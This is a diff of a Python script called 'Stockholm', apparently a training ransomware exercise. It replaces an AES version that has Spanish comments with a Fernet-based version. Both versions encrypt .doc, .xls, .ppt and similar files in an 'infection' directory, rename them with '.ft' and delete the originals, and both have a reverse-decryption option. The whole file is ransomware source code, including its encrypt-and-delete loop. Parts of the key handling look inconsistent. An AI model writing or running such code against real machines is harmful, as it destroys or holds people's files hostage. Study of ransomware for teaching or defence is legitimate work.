@@ -28,117 +28,97 @@ print('''\033[1;31m
     
 ''')
 
+# Library imports
+
 import os
 import argparse
-import hashlib
-from Crypto.Cipher import AES
+from cryptography.fernet import Fernet
 
-# Define las extensiones afectadas por Wannacry
-WANNACRY_EXTENSIONS = ['.doc', '.xls', '.ppt', '.docx', '.xlsx', '.pptx', '.pdf']
+# Constants
 
-# Define la clave de cifrado
-KEY = 'clave_de_cifrado_123'
+INFECTION_DIR = "/Users/abelrodr/infection"
+AFFECTED_EXTENSIONS = [".doc", ".ppt", ".xls", ".docx", ".pptx", ".xlsx"]
 
-# Define la longitud de la clave
-KEY_LENGTH = 16
+# Parsing
 
-# Define la función para cifrar un archivo
-def cifrar_archivo(nombre_archivo):
-    # Verifica que el archivo tenga una extensión afectada por Wannacry
-    _, extension = os.path.splitext(nombre_archivo)
-    if extension not in WANNACRY_EXTENSIONS:
-        return
+parser = argparse.ArgumentParser(description="Stockholm")
+parser.add_argument("-k", "--key", help="Key to encrypt/decrypt files")
+parser.add_argument("-kf", "--keyfile", default="key.txt", help="File containing the key to encrypt/decrypt files")
+parser.add_argument("-v", "--version", help="Show version", action="store_true")
+parser.add_argument("-r", "--reverse", help="Decrypt files")
+parser.add_argument("-s", "--silent", help="Silent mode", action="store_true")
 
-    # Verifica que el archivo no tenga ya la extensión ".ft"
-    if nombre_archivo.endswith('.ft'):
-        return
+args = parser.parse_args()
 
-    # Genera un nuevo nombre de archivo con la extensión ".ft"
-    nuevo_nombre = nombre_archivo + '.ft'
+# Functions
 
-    # Cifra el archivo
-    with open(nombre_archivo, 'rb') as archivo_origen:
-        with open(nuevo_nombre, 'wb') as archivo_destino:
-            # Lee el contenido del archivo
-            contenido = archivo_origen.read()
+def write_key_to_file(file_path):
+    key = Fernet.generate_key()
+    with open(file_path, "wb") as f:
+        f.write(key)
+    print(f"Key written to {file_path}")
+    return key
 
-            # Genera una clave a partir de la clave maestra
-            clave = hashlib.sha256(KEY.encode('utf-8')).digest()[:KEY_LENGTH]
+# If key is not provided, generate one and write it to a file
+if not args.key:
+    key = write_key_to_file(args.keyfile)
+else:
+    # Read key from file
+    with open(args.keyfile, "rb") as f:
+        key = f.read()
 
-            # Cifra el contenido del archivo
-            cipher = AES.new(clave, AES.MODE_EAX)
-            ciphertext, tag = cipher.encrypt_and_digest(contenido)
+# If the key is not 16 bytes long, put white spaces at the end
+if len(key) < 16:
+    key += b" " * (16 - len(key))
 
-            # Escribe el contenido cifrado en el archivo de destino
-            archivo_destino.write(ciphertext)
+if args.reverse:
+    # Decrypt files
+    key = args.reverse.encode()
+    if len(key) < 16:
+        key += b" " * (16 - len(key))
+    for filename in os.listdir(INFECTION_DIR):
+        # Check if file is infected
+        if filename.endswith(".ft"):
+            # Check if file is reverted
+            if not filename.endswith(".rft"):
+                try:
+                    # Read the file encrypted
+                    with open(os.path.join(INFECTION_DIR, filename), "rb") as f:
+                        encrypted_data = f.read()
+                    # Decrypt the file
+                    f = Fernet(key)
+                    decrypted_data = f.decrypt(encrypted_data)
+                    
+                    # Write the decrypted file
+                    with open(os.path.join(INFECTION_DIR, filename + ".rft"), "wb") as f:
+                        f.write(decrypted_data)
+                    
+                    # Remove the encrypted file
+                    os.remove(os.path.join(INFECTION_DIR, filename))
+                    if not args.silent:
+                        print(f"File {filename} decrypted")
+                except Exception as e:
+                    print(f"Error decrypting file {filename}: {e}")
 
-            # Muestra el nombre del archivo cifrado
-            print(f'Cifrando {nombre_archivo}')
-
-    # Borra el archivo original
-    os.remove(nombre_archivo)
-
-# Define la función para revertir la infección
-def revertir_infeccion(clave):
-    # Busca los archivos con la extensión ".ft"
-    archivos = [nombre_archivo for nombre_archivo in os.listdir('infection') if nombre_archivo.endswith('.ft')]
-
-    # Descifra los archivos
-    for nombre_archivo in archivos:
-        with open(os.path.join('infection', nombre_archivo), 'rb') as archivo_origen:
-            with open(os.path.join('infection', nombre_archivo[:-3]), 'wb') as archivo_destino:
-                # Lee el contenido cifrado del archivo
-                contenido_cifrado = archivo_origen.read()
-
-                # Genera una clave a partir de la clave maestra
-                clave = hashlib.sha256(clave.encode('utf-8')).digest()[:KEY_LENGTH]
-
-                # Descifra el contenido del archivo
-                cipher = AES.new(clave, AES.MODE_EAX, nonce=contenido_cifrado[:16])
-                contenido = cipher.decrypt_and_verify(contenido_cifrado[16:], contenido_cifrado[16:])
-
-                # Escribe el contenido descifrado en el archivo de destino
-                archivo_destino.write(contenido)
-
-                # Muestra el nombre del archivo descifrado
-                print(f'Descifrando {nombre_archivo}')
-
-        # Borra el archivo cifrado
-        os.remove(os.path.join('infection', nombre_archivo))
-
-# Define la función principal
-def main():
-    # Parsea los argumentos de línea de comando
-    parser = argparse.ArgumentParser(description='Stockholm ransomware')
-    parser.add_argument('-help', '-h', action='store_true', help='Mostrar ayuda')
-    parser.add_argument('-version', '-v', action='store_true', help='Mostrar versión')
-    parser.add_argument('-reverse', '-r', metavar='clave', help='Revertir la infección')
-    parser.add_argument('-silent', '-s', action='store_true', help='No mostrar output')
-    args = parser.parse_args()
-
-    # Muestra la ayuda si se indica la opción -help
-    if args.help:
-        parser.print_help()
-        return
-
-    # Muestra la versión si se indica la opción -version
-    if args.version:
-        print('Stockholm ransomware v1.0')
-        return
-
-    # Revierte la infección si se indica la opción -reverse
-    if args.reverse:
-        revertir_infeccion(args.reverse)
-        return
-
-    # Cifra los archivos de la carpeta "infection"
-    for nombre_archivo in os.listdir('infection'):
-        cifrar_archivo(os.path.join('infection', nombre_archivo))
-
-    # Muestra un mensaje final si no se indica la opción -silent
-    if not args.silent:
-        print('La infección ha sido completada')
-
-# Llama a la función principal
-if __name__ == '__main__':
-    main()
+else:
+    # Encrypt every file in the infection directory
+    for filename in os.listdir(INFECTION_DIR):
+        # Check if file is infected
+        if os.path.splitext(filename)[1].lower() in AFFECTED_EXTENSIONS:
+            if not filename.endswith(".ft"):
+                try:
+                    # Read the file
+                    with open(os.path.join(INFECTION_DIR, filename), "rb") as f:
+                        data = f.read()
+                    # Encrypt the file
+                    f = Fernet(key)
+                    encrypted_data = f.encrypt(data)
+                    # Write the encrypted file
+                    with open(os.path.join(INFECTION_DIR, filename + ".ft"), "wb") as f:
+                        f.write(encrypted_data)
+                    # Remove the original file
+                    os.remove(os.path.join(INFECTION_DIR, filename))
+                    if not args.silent:
+                        print(f"File {filename} encrypted")
+                except Exception as e:
+                    print(f"Error encrypting file {filename}: {e}")
